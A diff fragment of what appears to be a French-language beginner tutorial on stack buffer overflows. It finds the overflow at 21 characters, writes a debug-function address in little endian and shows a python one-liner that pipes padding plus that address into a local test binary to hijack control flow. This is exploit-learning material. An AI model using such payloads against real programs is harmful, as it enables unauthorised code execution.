@@ -132,4 +132,15 @@ une fois cette adresse memoire copier on va voir a partir de combien de caracter
 
 
 ![Scan](https://user-images.githubusercontent.com/39098396/62122510-270ddf00-b2c6-11e9-96a6-c54ab458593d.png)
+
 le debordement se fais donc a 21 caracteres
+
+Nous allons maintenant reprendre notre addresse de Debug afin de l'ajouter a la suite de notre chaine de caractere 
+mais en le convertissant en little endian ce qui fait : 
+\x20\x48\x55\x55\x55\x55
+
+nous allons donc envoyer ceci : 
+
+_python -c 'print ("123456789abcdefghijkl"+"\x20\x48\x55\x55\x55\x55")' | ./test_
+
+![Scan](https://user-images.githubusercontent.com/39098396/62122914-0f832600-b2c7-11e9-9bed-25cd02087321.png)
